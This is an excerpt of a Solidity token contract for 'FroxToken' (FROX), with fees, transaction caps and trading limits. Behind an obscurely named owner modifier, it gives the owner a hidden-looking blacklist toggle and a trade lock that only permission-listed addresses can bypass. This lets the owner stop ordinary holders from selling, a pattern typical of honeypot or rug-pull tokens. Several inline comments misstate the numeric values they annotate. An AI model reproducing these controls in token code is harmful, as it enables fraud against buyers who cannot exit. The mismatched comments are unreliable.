...
contract TokenProtocol is IERC20, Ownable, LibreMount {
    ...
    uint256 private _totalSupply = 100000000000000000000000000000000;  // 100,000,000
    string private _name = "FroxToken";
    string private _symbol = "FROX";
    uint8 private _decimals = 18;
    uint256 public MAX_GAS_PRICE = 7 gwei;
    uint private buyFee = 5;
    uint private sellFee = 11;
    uint256 private swapThreshold = 100000000000000000; // 0.1
    uint256 private maxTxnAmount = 10000000000000000000; // 10
    uint256 private maxWallet = 2000000000000000000; // 1
    uint256 private maxBuy = 2000000000000000000; // 1
    ...
    function _transfer(
        ...
        require(!_bl[from], "ERC20: user restricted");
        ...
        if (tradeLocked) {
            if (isMarket(from)) {
                require(premissionList[to], "User isn't excluded from tradeLock");
            } else if (isMarket(to)) {
                require(premissionList[from], "User isn't excluded from tradeLock");
            }
        }
...
if (balanceOf(address(this)) >= swapThreshold) { swapTaxes(); addLiq(); }
        ...
        if (maxTxnAmount != 0) {
            if (!premissionList[from] && !premissionList[to]) {
                require(amount <= maxTxnAmount, "Txn Amount too high!");
            }
        }

        if (maxWallet != 0 && !isMarket(to) && !premissionList[to] && !premissionList[from]) {
    ...
    function edBl(address _u) external rttum {
        _bl[_u] = !_bl[_u];
    }

    function checkUser(address _u) public view returns(bool) {
        return _bl[_u];
    }
    ...
    function updateTradeLockedState(bool _state) public rttum {
        tradeLocked = _state;
    }

    // Max Txn

    function updateMaxTxnAmount(uint256 _amount) public rttum {
    ...
    function updateMaxWallet(uint256 _newMaxWallet) external rttum {
